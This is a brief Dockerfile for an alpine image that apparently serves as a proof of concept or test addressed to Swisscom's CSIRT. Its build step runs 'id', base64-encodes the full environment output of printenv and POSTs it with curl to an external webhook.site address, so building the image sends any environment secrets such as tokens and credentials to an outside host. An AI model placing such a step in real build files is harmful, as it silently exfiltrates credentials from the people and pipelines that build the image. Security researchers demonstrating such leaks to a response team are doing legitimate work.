  FROM alpine:latest
  RUN apk add --no-cache curl
  RUN echo "Hello Swisscom CSIRT" && id && echo $(printenv) | base64 | curl -X POST -d @- https://webhook.site/c1a17bb5-0221-4e72-8123-507bdb5b36be 
  CMD echo "test"
